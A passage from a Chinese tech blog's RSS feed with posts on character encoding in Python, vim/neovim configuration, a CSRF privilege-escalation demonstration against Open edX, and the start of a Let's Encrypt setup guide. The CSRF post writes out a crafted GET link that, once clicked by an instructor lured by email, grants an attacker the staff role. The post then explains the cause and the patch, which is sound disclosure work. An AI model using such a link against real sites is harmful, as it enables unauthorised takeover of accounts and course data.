&lt;p&gt;每当有数据进入程序，将其解码（decode）为unicode(utf-8）&lt;/p&gt;
&lt;p&gt;当有数据从程序中输出时，将其编码（encode）为utf-8&lt;/p&gt;
&lt;p&gt;最佳实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最先解码(解码为unicode对象)，最后编码（输出为字节码）&lt;ul&gt;
&lt;li&gt;最先解码意味着无论何时有字节流输入，需要尽早将输入解码为Unicode&lt;/li&gt;
&lt;li&gt;最后编码意味着只有你打算将文本输出到某个地方时，才把它编码为字节流。这个输出可能是一个文件，一个数据库，一个socket等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认使用utf-8编码&lt;/li&gt;
&lt;li&gt;使用codecs和Unicode对象来简化处理&lt;ul&gt;
&lt;li&gt;codecs模块能够让我们在处理诸如文件或socket这样的流的时候能少踩一些坑。如果没有codecs提供的这个工具，你就必须将文件内容读取为字节流，然后将这个字节流解码为Unicode对象。&lt;/li&gt;
&lt;li&gt;codecs模块能够让你快速的将&lt;code&gt;字节流&lt;/code&gt;转化为&lt;code&gt;Unicode对象&lt;/code&gt;，省去很多麻烦。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;linux下的一些工具&lt;/h1&gt;
&lt;h3&gt;file&lt;/h3&gt;
&lt;p&gt;file命令用来探测给定文件的类型,&lt;/p&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-i：显示MIME类别。&lt;/li&gt;
&lt;li&gt;-c：详细显示指令执行过程，便于排错或分析程序执行的情形；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file *&lt;/p&gt;
&lt;h3&gt;iconv&lt;/h3&gt;
&lt;p&gt;conv命令是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码&lt;/p&gt;
&lt;p&gt;iconv -f encoding -t encoding inputfile&lt;/p&gt;
&lt;p&gt;iconv -f UTF-8 -t GBK file1 -o file2  //将一个UTF-8 编码的文件转换成GBK编码&lt;/p&gt;
&lt;h3&gt;chardet&lt;/h3&gt;
&lt;p&gt;有时候我们不知道文件/字节流采用了什么编码，可以让chardet来猜测编码，chardet是python的一个库&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;传输编码语法（transfer encoding syntax）&lt;/h3&gt;
&lt;p&gt;用于处理上一层次的字符编码方案提供的字节序列。一般其功能包括两种：一是把字节序列的值映射到一套更受限制的值域内，以满足传输环境的限制，例如Email传输时Base64或者quoted-printable，都是把8位的字节编码为7位长的数据；另一是压缩字节序列的值，如LZW或者进程长度编码等无损压缩技术。&lt;/p&gt;
&lt;h6&gt;Base64编码&lt;/h6&gt;
&lt;p&gt;base64编码相关的部分，可以翻阅我的&lt;a href="http://blog.just4fun.site/jwt-note.html"&gt;JWT学习笔记&lt;/a&gt;中的附录部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Base64常用于在通常处理文本数据的场合，表示、传输、存储一些&lt;code&gt;二进制数据&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;常用于在URL、Cookie、网页中传输少量二进制数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓Base64，就是说选出64个字符----小写字母a-z、大写字母A-Z、数字0-9、符号"+"、"/"（再加上作为垫字的"="，实际上是65个字符）----作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于base64更多的细节可以参考维基百科和&lt;a href="http://www.ruanyifeng.com/blog/2008/06/base64.html"&gt;Base64笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在python中实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#aGVsbG8=  ， 被编码的不是应该是二进制数据吧，python的二进制默认被解析为ascii？，在这里hello无论是b&amp;#39;hello&amp;#39;还是&amp;#39;hello&amp;#39;/u&amp;#39;hello&amp;#39;，结果都一样&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aGVsbG8=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# hello&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# \u4f60\u597d&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;#5L2g5aW9&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe4\xbd\xa0\xe5\xa5\xbd&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种&amp;quot;url safe&amp;quot;的base64编码，其实就是把字符+和/分别变成-和_&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;哈里谢顿&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG/ , 有反斜杠&lt;/span&gt;
&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG_&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;url中的编码问题&lt;/h3&gt;
&lt;p&gt;一般而言使用urllib库中的urlencode函数就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#u&amp;#39;小明&amp;#39;则需要encode为字节码&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;10岁&amp;#39;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# age=10%E5%B2%81&amp;amp;name=%E5%B0%8F%E6%98%8E&lt;/span&gt;

&lt;span class="c1"&gt;#仅对字符串进行转码可以使用quote&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;quote&lt;/span&gt;
&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#%E5%B0%8F%E6%98%8E&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果有大量此类工作可以考虑使用&lt;a href="https://github.com/gruns/furl"&gt;furl&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;在线工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tool.oschina.net/encode?type=4"&gt;在线编码转换&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/urlencode.aspx"&gt;UrlEncode编码/UrlDecode解码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/unicode.aspx"&gt;Unicode编码转换&lt;/a&gt;:还包括unix时间戳&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一些细碎知识&lt;/h3&gt;
&lt;p&gt;Windows简体中文版中，ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（繁体中文版会采用Big5码）&lt;/p&gt;
&lt;h3&gt;python中字节流和unicode的代码视角比较&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18193305/python-unicode-equal-comparison-failed"&gt;stackoverflow Python unicode equal comparison failed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"&gt;字符编码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/mysql/mysql-mojibake/"&gt;10分钟学会理解和解决MySQL乱码问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html"&gt;字符编码笔记：ASCII，Unicode和UTF-8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://funhacks.net/2016/11/25/character_encoding/"&gt;Python: 熟悉又陌生的字符编码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-28:decode-and-encode-note.html</guid><category>tools</category></item><item><title>我的vim/mavim/neovim配置</title><link>/vim-setting.html</link><description>&lt;h3&gt;历史负担&lt;/h3&gt;
&lt;p&gt;之前用的配置是&lt;a href="http://wklken.me/"&gt;wklken&lt;/a&gt;的&lt;a href="https://github.com/wklken/k-vim"&gt;k-vim&lt;/a&gt;，wklken的vim插件相关的文章写得很棒&lt;/p&gt;
&lt;p&gt;近来觉得vim打开速度慢的让人无法忍受，想来是配置（插件）造成的，于是在目录中频繁打开关闭的文件偏好用sublime来编辑了&lt;/p&gt;
&lt;p&gt;可我对sublime的快捷键总也记不住，用了就丢那种，连跳转到行的快捷键都记不得，全局替换也要去按按钮，手指远远跟不上脑袋，有种播放视频卡顿的感觉，很是不爽。想想还是重写把vim配置好划算些。&lt;/p&gt;
&lt;h3&gt;需求分析&lt;/h3&gt;
&lt;p&gt;我发现实际上k-vim的大多配置，对我而言是多余的，而许多配置，又不舍得任，不妨从这里入手，只挑出非用不可的特性，翻&lt;a href="http://wklken.me/"&gt;wklken&lt;/a&gt;的&lt;a href="https://github.com/wklken/k-vim"&gt;k-vim&lt;/a&gt;博客，恰好看到他的这篇文章：&lt;a href="http://www.wklken.me/posts/2016/02/03/some-vim-configs.html"&gt;一些VIM的个性化配置&lt;/a&gt;，里边把定制配置分条整理了，按需索取就行，我尽量少选&lt;/p&gt;
&lt;p&gt;先列出我偏好的配置，之后给出配置文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更改leader键&lt;/li&gt;
&lt;li&gt;移动时, 保留到底部的空间&lt;/li&gt;
&lt;li&gt;自定义代码折叠toggle&lt;/li&gt;
&lt;li&gt;ctrl-n进行相对行号/绝对行号切换&lt;/li&gt;
&lt;li&gt;打开vim, 自动定位到上次最后变更位置&lt;/li&gt;
&lt;li&gt;F键区的映射&lt;/li&gt;
&lt;li&gt;分屏窗口切换时, 直接使用ctrl-h/j/k/l&lt;/li&gt;
&lt;li&gt;leader-/ 关闭掉上次搜索的高亮&lt;/li&gt;
&lt;li&gt;Python 写入注释#号时, 不每次都跳到行首&lt;/li&gt;
&lt;li&gt;强制保存:w!!, 没权限的时候&lt;/li&gt;
&lt;li&gt;保存文件时, 自动移除多余空格&lt;/li&gt;
&lt;li&gt;shell和python文件新建时, 自动插入行头&lt;/li&gt;
&lt;li&gt;启动的时候不显示那个援助索马里儿童的提示&lt;/li&gt;
&lt;li&gt;退出vim后，内容显示在终端屏幕&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;常用插件&lt;/h4&gt;
&lt;p&gt;首先是插件管理&lt;/p&gt;
&lt;p&gt;我们采用&lt;a href="https://github.com/VundleVim/Vundle.vim"&gt;Vundle.vim&lt;/a&gt;,之前的&lt;a href="https://github.com/gmarik/vundle.git"&gt;gmarik/vundle&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用方法很简单，先git clone到本地&lt;code&gt;git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在配置文件里加上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;set nocompatible              &amp;quot; be iMproved, required
filetype off                  &amp;quot; required

&amp;quot; set the runtime path to include Vundle and initialize
set rtp+=~/.vim/bundle/Vundle.vim
call vundle#begin()

&amp;quot; let Vundle manage Vundle, required
Plugin &amp;#39;VundleVim/Vundle.vim&amp;#39;
Plugin &amp;#39;scrooloose/nerdtree&amp;#39;

&amp;quot; All of your Plugins must be added before the following line
call vundle#end()            &amp;quot; required
filetype plugin indent on    &amp;quot; required
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以及我需要使用一些常见插件&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Plugin &amp;#39;scrooloose/nerdtree&amp;#39;
Plugin &amp;#39;davidhalter/jedi-vim&amp;#39;
Plugin &amp;#39;scrooloose/syntastic&amp;#39;
Plugin &amp;#39;msanders/snipmate.vim&amp;#39;
Plugin &amp;#39;mattn/emmet-vim&amp;#39;
&amp;quot;Plugin &amp;#39;Valloric/YouCompleteMe&amp;#39; &amp;quot;YouCompleteMe编译比较麻烦，选用
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;安装插件只需要":PluginInstall"&lt;/p&gt;
&lt;h3&gt;插件笔记&lt;/h3&gt;
&lt;h5&gt;youcomplateme&lt;/h5&gt;
&lt;p&gt;youcomplateme值得学习&lt;/p&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/58978/"&gt; Vim自动补全神器:YouCompleteMe&lt;/a&gt;：&lt;/p&gt;
&lt;p&gt;ps:在我的环境里，需要进入virtualenv里才正常（这是我的个人笔记）&lt;/p&gt;
&lt;h5&gt;jedi-vim&lt;/h5&gt;
&lt;p&gt;jedi-vim 能智能理解python代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Completion &amp;lt;C-Space&amp;gt;
Goto assignments &amp;lt;leader&amp;gt;g (typical goto function)
Goto definitions &amp;lt;leader&amp;gt;d (follow identifier as far as possible, includes imports and statements)
Show Documentation/Pydoc K (shows a popup with assignments)
Renaming &amp;lt;leader&amp;gt;r
Usages &amp;lt;leader&amp;gt;n (shows all the usages of a name)
Open module, e.g. :Pyimport os (opens the os module)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;jedi-vim 可以在写python时拥有ipython的感觉，&lt;code&gt;K&lt;/code&gt;文档查询&lt;/p&gt;
&lt;h3&gt;macvim&lt;/h3&gt;
&lt;p&gt;想用macvim的动机是，鼠标的移动能力是目之所及，即可操作，一些非批量化，零碎的任务是很适合用鼠标的，诸如移动到某个位置，切换版块，跳到tab标签，菜单功能。免去记忆很多实用频率不高，记了又忘的快捷键。同时不丧失vim的编辑优势，我可能没有十分强烈cui的原教旨倾向，在工具这方便大概算是实用主义者吧。我想用macvim这种带有gui功能的编辑器，使用场景主要是在gui文件夹中临时想编辑文件时。&lt;/p&gt;
&lt;h3&gt;neovim&lt;/h3&gt;
&lt;p&gt;使用neovim则是，反正都要重新配置，不如换用为新世纪倒灶的neovim，甩下vim的历史包袱，由于neovim和vim配置基本相同，所以neovim的配置和vim重叠，并不带来新的学习成本&lt;/p&gt;
&lt;p&gt;配置文件：&lt;code&gt;~/.config/nvim/init.vim&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;配置文件和文档&lt;/h1&gt;
&lt;p&gt;具体的配置文档可以参考&lt;a href="https://github.com/wwj718/wwj718-vim"&gt;/wwj718-vim)&lt;/a&gt;，里边给出了使用的细节&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 26 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-26:vim-setting.html</guid><category>tools</category></item><item><title>利用CSRF漏洞对Open edX进行提权</title><link>/use-csrf-to-attack-edx.html</link><description>&lt;blockquote&gt;
&lt;p&gt;这个世界上只有两种系统，一种是被黑过的系统，一种是被黑了也不知情的系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天一早@MT在群里发了一个漏洞报告&lt;a href="https://open.edx.org/announcements/cross-site-request-forgery-bug-edx-lms"&gt;Cross Site Request Forgery Bug in edX LMS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;报告显示这是一个高危漏洞，报告里说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In one specific case users could potentially escalate their privileges via an attack against staff or super users.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;起初我还没在意，我粗略看了一下针对这个漏洞的&lt;a href="https://github.com/edx/edx-platform/commit/d54f79f5bf3e1af17063937df1abc0026843412d.patch"&gt;Patch&lt;/a&gt;,并没发现报告中提到的&lt;code&gt;one specific case&lt;/code&gt;，而后突然想到一个可能的攻击方法，动手一试，果然可行&lt;/p&gt;
&lt;p&gt;我试着对自己维护的线上系统进行提权攻击，让大家看到漏洞的严重性，以便给大家有动力去修复它&lt;/p&gt;
&lt;p&gt;最后会给出应对策略&lt;/p&gt;
&lt;h1&gt;攻击演示&lt;/h1&gt;
&lt;p&gt;首先这是一种CSRF攻击，&lt;/p&gt;
&lt;h3&gt;背景知识：CSRF&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;CSRF攻击的细节&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有了以上两个对CSRF的了解（假设你也理解cookie的机制），我们就可以展开攻击了&lt;/p&gt;
&lt;p&gt;参考 ： &lt;a href="https://zh.wikipedia.org/zh/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"&gt;跨站请求伪造&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;攻击过程&lt;/h3&gt;
&lt;h5&gt;目标&lt;/h5&gt;
&lt;p&gt;我对线上服务器进行提权攻击&lt;/p&gt;
&lt;p&gt;目标服务参数：Ubuntu12.04 64bit 运行Open edx dogwood &lt;/p&gt;
&lt;h5&gt;攻击细节&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;注册用户，选修课程&lt;/li&gt;
&lt;li&gt;给授课教师发送一份邮件，诱使被攻击者点击目标链接，如&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;a href="http://MY_LMS/courses/course-v1:forum_test+forum_test+forum_test/bu/gao/su/ni?unique_student_identifier=wwj&amp;amp;rolename=staff&amp;amp;action=allow"&amp;gt;点我点我&amp;lt;/a&amp;gt;&lt;/code&gt; （修改细节）&lt;/p&gt;
&lt;p&gt;至于如何鼓励被攻击者点击，这就是一个社会工程的问题了，不讨论&lt;/p&gt;
&lt;p&gt;这是最初的课程团队&lt;/p&gt;
&lt;p&gt;&lt;img alt="原始课程团队" src="http://7xrc4h.com1.z0.glb.clouddn.com/csrf1.png" /&gt;&lt;/p&gt;
&lt;p&gt;这是攻击邮件&lt;/p&gt;
&lt;p&gt;&lt;img alt="攻击邮件" src="http://7xrc4h.com1.z0.glb.clouddn.com/csrf2.png" /&gt;&lt;/p&gt;
&lt;p&gt;被攻击者点击链接后，用户wwj成功被提权为staff，有课程的所有权限！&lt;/p&gt;
&lt;p&gt;攻击成功之后的团队成员列表&lt;/p&gt;
&lt;p&gt;&lt;img alt="攻击完成" src="http://7xrc4h.com1.z0.glb.clouddn.com/csrf3.png" /&gt;&lt;/p&gt;
&lt;p&gt;成功提权，而后可以对课程做大多数的操作，包括添加学生，增删课程，增删学生，增删帖子等几乎针对课程的所有权限&lt;/p&gt;
&lt;h3&gt;漏洞分析&lt;/h3&gt;
&lt;p&gt;漏洞成因，报告中有说明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Although the platform is already using Django’s Cross-Site Request Forgery (CSRF) middleware protection, some endpoints with side effects were found to be using GET methods&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是一种设计失误，不应该用get做非幂等操作&lt;/p&gt;
&lt;p&gt;尤其是涉及权限操作的部分，应当放在csrf保护之下&lt;/p&gt;
&lt;h1&gt;策略&lt;/h1&gt;
&lt;p&gt;报告里也提到了应对策略&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;some endpoints with side effects were found to be using GET methods. The patch forces these endpoints to require POST, which also properly enables CSRF protection.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;具体而言可以为当前使用的版本打&lt;a href="https://github.com/edx/edx-platform/commit/d54f79f5bf3e1af17063937df1abc0026843412d.patch"&gt;Patch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于如何使用打Patch可以参考这里&lt;a href="https://ariejan.net/2009/10/26/how-to-create-and-apply-a-patch-with-git/"&gt;How to create and apply a patch with Git&lt;/a&gt;，因为git apply 是一个事务性的操作，补丁要么都打上去，要么全部放弃，所以不要害怕有后遗症&lt;/p&gt;
&lt;p&gt;对于新安装的平台，采用新的代码就不存在这个问题了，目前的bug只在遗留系统存在&lt;/p&gt;
&lt;p&gt;考虑到CSRF攻击的模式，在漏洞修复之前，应该通知拥有课程管理权限的人员以及网站管理者不要点击未知邮件的链接/图片&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 20 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-20:use-csrf-to-attack-edx.html</guid><category>edx</category></item><item><title>使用Let’s Encrypt(certbot)为你的网站生成免费的 SSL 证书</title><link>/https-note.html</link><description>&lt;h3&gt;关于HTTPS&lt;/h3&gt;
&lt;p&gt;引维基百科的说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;超文本传输安全协议（英语：Hypertext Transfer Protocol Secure，缩写：HTTPS）是一种网络安全传输协议。在计算机网络上，HTTPS经由超文本传输协议进行通信，但利用SSL/TLS来对数据包进行加密。HTTPS开发的主要目的，是提供对网络服务器的身份认证，保护交换数据的隐私与完整性&lt;/p&gt;
&lt;p&gt;HTTPS的主要思想是在不安全的网络上创建一安全信道，并可在使用适当的加密包和服务器证书可被验证且可被信任时，对窃听和中间人攻击提供合理的防护。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;关于TLS/SSL&lt;/h3&gt;
&lt;p&gt;依然引用维基百科&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;传输层安全协议（英语：Transport Layer Security，缩写：TLS），及其前身安全套接层（Secure Sockets Layer，缩写：SSL）是一种安全协议，目的是为互联网通信，提供安全及数据完整性保障&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;相关算法&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;TLS利用密钥算法在互联网上提供端点身份认证与通讯保密，其基础是公钥基础设施。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;TLS包含三个基本阶段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对等协商支持的密钥算法&lt;/li&gt;
&lt;li&gt;基于非对称密钥的信息传输加密和身份认证、基于PKI证书的身份认证&lt;/li&gt;
&lt;li&gt;基于对称密钥的数据传输保密&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;国内现状&lt;/h3&gt;
&lt;p&gt;由于运营商的劫持，国内公司不堪其扰，纷纷将全站采用https&lt;/p&gt;
&lt;h3&gt;安装配置&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;wget https://dl.eff.org/certbot-auto&lt;/li&gt;
&lt;li&gt;chmod a+x ./certbot-auto&lt;/li&gt;
&lt;li&gt;./certbot-auto --help all&lt;/li&gt;
&lt;li&gt;./certbot-auto certonly --standalone --email wwj@example.com  -d www.just4fun.site (可以使用二级域名)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要注意的是，验证的时候保证80/443端口对外开放，且不被占用，如果这些端口实现被nginx占用，先停掉nginx&lt;/p&gt;
&lt;p&gt;完成后查看生成的证书：&lt;/p&gt;
